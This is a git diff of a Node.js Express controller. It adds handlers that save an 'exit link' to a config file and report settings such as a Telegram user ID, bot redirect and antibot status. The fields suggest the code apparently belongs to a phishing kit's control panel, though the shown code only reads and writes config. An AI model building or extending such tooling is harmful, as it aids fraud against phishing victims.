@@ -1,6 +1,7 @@
 const fs = require('fs')
 const { validationResult } = require('express-validator');
-const superagent = require('superagent')
+const superagent = require('superagent');
+const { info } = require('console');
 
 
 
@@ -107,6 +108,30 @@ exports.setTelegramID = (req, res) => {
     })
 }
 
+exports.setExitLink = (req, res) => {
+    const vResult = validationResult(req);
+    const hasErrors = !vResult.isEmpty();
+    if (hasErrors) {
+            return res.status(402).json(vResult.errors);
+    }
+
+    const exitLink = req.body.exitLink
+
+    const userFileObj = JSON.parse(fs.readFileSync('./nkp/config/user.json'))
+
+    userFileObj.EXIT_LINK = exitLink
+
+    fs.writeFileSync('./nkp/config/user.json', JSON.stringify(userFileObj, '', 4))
+
+    return res.json({
+        status: "Success",
+        error: null,
+        code: 0,
+        message: `Successfully set Exit Link to ${exitLink}`,
+        info: exitLink,
+    })
+}
+
 exports.changeAntibot = (req, res) => {
     const vResult = validationResult(req);
     const hasErrors = !vResult.isEmpty();
@@ -159,4 +184,29 @@ exports.changeAntibot = (req, res) => {
 
 exports.setProxy = (req, res) => {
 
+}
+
+
+exports.getInformation = (req, res) => {
+    const userFileObj = JSON.parse(fs.readFileSync('./nkp/config/user.json'))
+
+    const infoObj = {}
+
+    infoObj.CURRENT_PROJECT = userFileObj.CURRENT_PROJECT
+    infoObj.TELEGRAM_USER_ID = userFileObj.TELEGRAM_USER_ID
+    infoObj.BOT_REDIRECT = userFileObj.BOT_REDIRECT
+    infoObj.EXIT_LINK = userFileObj.EXIT_LINK
+
+    infoObj.ANTIBOT = userFileObj.GATE_KEY ? 'OFF' : 'ON'
+
+    // infoObj.STATE=  
+
+
+    return res.json({
+        status: "Success",
+        error: null,
+        code: 0,
+        info: `${JSON.stringify(infoObj, '', 4)}`,
+        message: 'SErver Status Fetched Sucessfully',
+    })
 }
